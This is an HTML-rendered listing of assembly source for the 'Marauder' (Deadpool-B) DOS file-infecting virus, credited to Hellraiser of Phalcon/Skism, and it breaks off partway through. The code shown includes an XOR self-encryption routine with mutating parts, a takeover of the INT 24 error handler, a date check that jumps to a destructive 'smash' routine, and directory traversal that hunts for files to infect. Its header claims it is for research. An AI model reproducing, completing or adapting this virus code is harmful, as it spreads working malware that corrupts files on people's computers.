<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>MARAUDER.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; "Marauder" Virus</span><span class="sc0">
</span><span class="sc1">; AKA Deadpool-B</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; By Hellraiser</span><span class="sc0">
</span><span class="sc1">; Of Phalcon/Skism</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; For virus reseach only</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; I always wanted to release this source, so here it is.  Now that it's been caught</span><span class="sc0">
</span><span class="sc1">; take a look at whats inside.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; I know it's no great thing, but it's good to learn from.  It contains basic </span><span class="sc0">
</span><span class="sc1">; encryption, mutation, and INT 24 handling.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; I will be very upset if I see 100 new versions of this code with some lame kids </span><span class="sc0">
</span><span class="sc1">; name in place of mine.  So just use it to learn from, it's very straight foward.</span><span class="sc0">



</span><span class="sc5">code</span><span class="sc0">          </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc12">'code'</span><span class="sc0">
</span><span class="sc9">assume</span><span class="sc0">        </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc0">
</span><span class="sc9">org</span><span class="sc0">           </span><span class="sc2">0100h</span><span class="sc0">

</span><span class="sc5">dta</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">endcode</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">headlength</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">headend</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">headstart</span><span class="sc0">
</span><span class="sc5">bodylength</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">bodyend</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">bodystart</span><span class="sc0">
</span><span class="sc5">encryptpart</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">bodyend</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mixed_up</span><span class="sc0">
</span><span class="sc5">part1size</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">part2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">part1</span><span class="sc0">
</span><span class="sc5">part2size</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">parta</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">part2</span><span class="sc0">
</span><span class="sc5">partasize</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">partb</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">parta</span><span class="sc0">
</span><span class="sc5">partbsize</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">dude</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">partb</span><span class="sc0">
</span><span class="sc5">mutants</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">chris</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">part1</span><span class="sc0">
</span><span class="sc5">total_mutant</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">mutants</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">encryptlength</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">encryptpart</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">virus_size</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">headlength</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">bodylength</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc1">; head + body + int24 + 2</span><span class="sc0">
</span><span class="sc5">drive</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">endcode</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">110</span><span class="sc0">
</span><span class="sc5">backslash</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">endcode</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">111</span><span class="sc0">
</span><span class="sc5">orig_path</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">endcode</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">113</span><span class="sc0">
</span><span class="sc5">dirdta</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">orig_path</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">66</span><span class="sc0">
</span><span class="sc5">myid</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">88h</span><span class="sc0">
</span><span class="sc5">toolarge</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">65535</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">virus_size</span><span class="sc0">
</span><span class="sc5">fileattr</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
</span><span class="sc5">filetime</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">22</span><span class="sc0">
</span><span class="sc5">filedate</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">24</span><span class="sc0">
</span><span class="sc5">filename</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">30</span><span class="sc0">

</span><span class="sc5">headstart</span><span class="sc4">:</span><span class="sc0">

              </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">bodystart</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc5">myid</span><span class="sc0">
</span><span class="sc5">headend</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">realprogramstart</span><span class="sc4">:</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">               
              </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1ah</span><span class="sc0">      
</span><span class="sc5">realprogramend</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">bodystart</span><span class="sc4">:</span><span class="sc0">
              </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">deadpool</span><span class="sc0">
</span><span class="sc5">deadpool</span><span class="sc4">:</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                         
              </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">deadpool</span><span class="sc0">        
              </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encrypt</span><span class="sc0">
              </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">chris</span><span class="sc0">

</span><span class="sc5">enc_code</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">                     

</span><span class="sc5">encrypt</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">assume</span><span class="sc0">        </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc0">

</span><span class="sc5">part1_</span><span class="sc4">:</span><span class="sc0">
              </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                       
              </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                        
              </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                        
              </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                       
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">encryptlength</span><span class="sc0">         
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                    
              </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">bodyend</span><span class="sc0">        
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                      
              </span><span class="sc6">std</span><span class="sc0">                            
</span><span class="sc5">xor_loop</span><span class="sc4">:</span><span class="sc0">
              </span><span class="sc6">lodsw</span><span class="sc0">                             
              </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">enc_code</span><span class="sc4">]</span><span class="sc0">        
              </span><span class="sc6">stosw</span><span class="sc0">                              
              </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">xor_loop</span><span class="sc0">
</span><span class="sc5">done_</span><span class="sc4">:</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">                   
              </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                        
              </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                        
              </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                         
              </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                         

              </span><span class="sc6">ret</span><span class="sc0">
             </span><span class="sc1">;nop</span><span class="sc0">

</span><span class="sc5">encrypt</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">infect</span><span class="sc0">        </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">

              </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encrypt</span><span class="sc0">                   
              </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     
              </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encrypt</span><span class="sc0">                   
              </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">infect</span><span class="sc0">        </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">mixed_up</span><span class="sc4">:</span><span class="sc0">



</span><span class="sc5">part1</span><span class="sc4">:</span><span class="sc0">
              </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
              </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
              </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
              </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">encryptlength</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
              </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mixed_up</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
              </span><span class="sc6">cld</span><span class="sc0">

</span><span class="sc5">part2</span><span class="sc4">:</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">



</span><span class="sc5">parta</span><span class="sc4">:</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
              </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">endcode</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
              </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
              </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
              </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
              </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">encryptlength</span><span class="sc0">
              </span><span class="sc6">std</span><span class="sc0">

</span><span class="sc5">partb</span><span class="sc4">:</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">


</span><span class="sc5">dude</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; don't get any ideas lamer</span><span class="sc0">

</span><span class="sc5">hellraiser</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">idbuffer</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc12">' [Marauder] 1992 Hellraiser - Phalcon/Skism. '</span><span class="sc0">
</span><span class="sc5">stringsize</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">hellraiser</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">chris</span><span class="sc4">:</span><span class="sc0">

              </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3524h</span><span class="sc0">                 
              </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                       
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">oint24</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">oint24</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">

              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2524h</span><span class="sc0">                 
              </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">newint24</span><span class="sc4">]</span><span class="sc0"> 
              </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                       

              </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">                       
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">47h</span><span class="sc0">                    
              </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                     
              </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">orig_path</span><span class="sc0">      
              </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                      

              </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                         
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">19h</span><span class="sc0">                    
              </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                       

              </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">41h</span><span class="sc0">                   
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">drive</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'\:'</span><span class="sc0">                 
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">backslash</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

              </span><span class="sc1">;mov     byte ptr [si + offset defaultdrive], al </span><span class="sc0">


</span><span class="sc1">; here's my new tri-dimensional jmp displacement theory in play</span><span class="sc0">

              </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">                        
              </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">                       

              </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">oldjmp</span><span class="sc4">]</span><span class="sc0">   
              </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">thisjmp</span><span class="sc4">]</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">                    
              </span><span class="sc6">cld</span><span class="sc0">                                
              </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                   

              </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">                        
              </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                       
</span><span class="sc5">why</span><span class="sc4">:</span><span class="sc0">

              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">                    
              </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">dta</span><span class="sc4">]</span><span class="sc0">            
              </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     

              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2ah</span><span class="sc0">                  
              </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                      

              </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0202h</span><span class="sc0">                  
              </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">ff</span><span class="sc0">                        
              </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">smash</span><span class="sc0">                      

</span><span class="sc5">ff</span><span class="sc4">:</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0">                  
              </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filespec</span><span class="sc4">]</span><span class="sc0">         
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07h</span><span class="sc0">                    

</span><span class="sc5">searchloop</span><span class="sc4">:</span><span class="sc0">

              </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                        
              </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">here</span><span class="sc0">                      
              </span><span class="sc1">;jmp    up</span><span class="sc0">



              </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">
              </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">dirdta</span><span class="sc4">]</span><span class="sc0">         
              </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">21h</span><span class="sc0">                       

              </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc0">                    
              </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rootdir</span><span class="sc4">]</span><span class="sc0">  
              </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">21h</span><span class="sc0">                       
              </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">at_root</span><span class="sc0">                   
              </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">why</span><span class="sc0">                       

</span><span class="sc5">at_root</span><span class="sc4">:</span><span class="sc0">
              </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">donebefore</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
              </span><span class="sc6">je</span><span class="sc0">       </span><span class="sc5">notokey</span><span class="sc0">                  
                                                
              </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">                   
              </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">donebefore</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">     

              </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0">                  
              </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                     
              </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">13h</span><span class="sc0">                   
                                                 

              </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">dwildcards</span><span class="sc4">]</span><span class="sc0">     
</span><span class="sc5">ffdloop</span><span class="sc4">:</span><span class="sc0">

              </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">21h</span><span class="sc0">                       
              </span><span class="sc6">jnc</span><span class="sc0">      </span><span class="sc5">okey</span><span class="sc0">                     
              </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc10">far</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">nofilesfound</span><span class="sc0">     

</span><span class="sc5">notokey</span><span class="sc4">:</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">                    
              </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">ffdloop</span><span class="sc0">                   

</span><span class="sc5">okey</span><span class="sc4">:</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc0">                     
              </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dirdta</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filename</span><span class="sc4">]</span><span class="sc0">
              </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">21h</span><span class="sc0">                       
              </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">notokey</span><span class="sc0">                  
              </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">why</span><span class="sc0">                        


